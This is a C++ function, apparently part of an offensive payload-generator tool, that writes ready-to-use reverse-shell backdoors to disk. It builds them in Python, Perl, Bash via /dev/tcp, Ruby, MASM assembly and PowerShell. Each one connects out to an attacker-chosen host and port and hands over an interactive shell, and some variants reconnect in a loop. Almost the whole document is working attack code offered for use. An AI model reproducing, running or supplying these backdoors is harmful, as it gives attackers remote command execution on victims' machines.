
void scriptPayloads (char *backdoor, string lhost, string lport) {

    char ext[5]; string output;

    if (!strcmp(backdoor,"backdoors/unix/python/reverse_tcp")) {

        strcpy(ext, ".py");

        output=
                    "import socket,subprocess,os\n"
                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
                    "s.connect((\"";
        output+=    lhost;
        output+=    "\",";
        output+=    lport;
        output+=    "))\n";

        output+=
                    "os.dup2(s.fileno(),0)\n"
                    "os.dup2(s.fileno(),1)\n"
                    "os.dup2(s.fileno(),2)\n"
                    "p=subprocess.call([\"/bin/sh\",\"-i\"]);\n";
    }

    else if (!strcmp(backdoor,"backdoors/unix/perl/reverse_tcp")) {

        strcpy(ext, ".pl");

        output=     "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"";
        output+=    lhost;
        output+=    ":";
        output+=    lport;
        output+=    "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'";

    }

    else if (!strcmp(backdoor,"backdoors/unix/bash/reverse_tcp")) {

        strcpy(ext, ".sh");

        output=     "0<&46-;exec 46<>/dev/tcp/";
        output+=    lhost;
        output+=    "/";
        output+=    lport;
        output+=    ";sh <&46 >&46 2>&46";
    }

    else if (!strcmp(backdoor,"backdoors/unix/ruby/reverse_tcp")) {

        strcpy(ext, ".rb");

        output =
            "#!/usr/bin/env ruby\n"
            "require 'socket'\n"
            "require 'open3'\n\n";

        output+=    "RHOST = \"";
        output+=    lhost;
        output+=    "\"\n";
        output+=    "PORT = \"";
        output+=    lport;
        output+=    "\"\n\n";

        output+=
                    "begin\n"
                    "sock = TCPSocket.new \"#{RHOST}\", \"#{PORT}\"\n"
                    "rescue\n"
                    "    sleep 20\n"
                    "    retry\n"
                    "    end\n\n"

                    "begin\n"
                    "    while line = sock.gets\n"
                    "        Open3.popen2e(\"#{line}\") do | stdin, stdout_and_stderr |\n"
                    "            IO.copy_stream(stdout_and_stderr, sock)\n"
                    "            end\n"
                    "    end\n"
                    "rescue\n"
                    "    retry\n"
                    "end\n";
    }

    else if (!strcmp(backdoor,"backdoors/windows/asm/reverse_tcp")) {

        strcpy(ext, ".s");

        output =
                    ".386\n"
                    ".model flat, stdcall\n"
                    "option casemap:none\n"
                    "include \\masm32\\include\\windows.inc\n"
                    "include \\masm32\\include\\kernel32.inc\n"
                    "include \\masm32\\include\\ws2_32.inc\n"
                    "include \\masm32\\include\\masm32.inc\n"
                    "includelib \\masm32\\lib\\ws2_32.lib\n"
                    "includelib \\masm32\\lib\\kernel32.lib\n"
                    "includelib \\masm32\\lib\\masm32.lib\n\n"
                    ".data\n"
                    "  cmd     db \"cmd\",0\n";

        output+=    "  UrIP    db \"";
        output+=    lhost;
        output+=    "\",0\n";
        output+=    "  port    db \"";
        output+=    lport;
        output+=    "\",0\n"
                    ".data?\n"
                    "  sinfo   STARTUPINFO<>\n"
                    "  pi      PROCESS_INFORMATION<>\n"
                    "  sin     sockaddr_in<>\n"
                    "  WSAD    WSADATA<>\n"
                    "  Wsocket dd ?\n"
                    ".code\n"
                    "start:\n"
                    "    invoke WSAStartup, 101h, addr WSAD\n"
                    "    invoke WSASocket,AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0\n"
                    "           mov Wsocket, eax\n"
                    "           mov sin.sin_family, 2\n"
                    "    invoke atodw, addr port\n"
                    "    invoke htons, eax\n"
                    "           mov sin.sin_port, ax\n"
                    "    invoke gethostbyname, addr UrIP\n"
                    "          mov eax, [eax+12]\n"
                    "          mov eax, [eax]\n"
                    "          mov eax, [eax]\n"
                    "          mov sin.sin_addr, eax\n\n"

                    "          mov eax,Wsocket\n"
                    "          mov sinfo.hStdInput,eax\n"
                    "          mov sinfo.hStdOutput,eax\n"
                    "          mov sinfo.hStdError,eax\n"
                    "          mov sinfo.cb,sizeof STARTUPINFO\n"
                    "          mov sinfo.dwFlags,STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES\n"
                    " shellagain:\n"
                    "    invoke connect, Wsocket, addr sin , sizeof(sockaddr_in)\n"
                    "    invoke CreateProcess,NULL,addr cmd,NULL,NULL,TRUE,8000040h,NULL,NULL,addr sinfo,addr pi\n"
                    "    invoke WaitForSingleObject,pi.hProcess,INFINITE\n"
                    "    jmp shellagain\n"
                    " ret\n"
                    "end start\n";
    }

    else if (!strcmp(backdoor,"backdoors/windows/ps/reverse_tcp")) {

        strcpy(ext, ".ps1");

        output+="$client = New-Object System.Net.Sockets.TCPClient(\"";
        output+=lhost;
        output+="\",";
        output+=lport;
        output+=");$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
    }

    else {
        red(); printf("Error!\n");
        return;
    }

    char rn[30];
    srand(time(NULL));
    int x = rand() % 99999 + 11111;
    snprintf(rn, sizeof(rn), "%d", x);
    strcat(rn,ext);

    string filename(rn);
    std::ofstream outfile (filename.c_str());
    outfile << output;
    outfile.close();

    char *path = NULL; path = getcwd(NULL, 0);

    if ( path != NULL )
        green();

        #ifdef nt
            cout << "\n\tExploit Location : " << path << "\\" << filename << "\n\n";
        #else
            cout << "\n\tExploit Location : " << path << "/" << filename << "\n\n";
        #endif
}
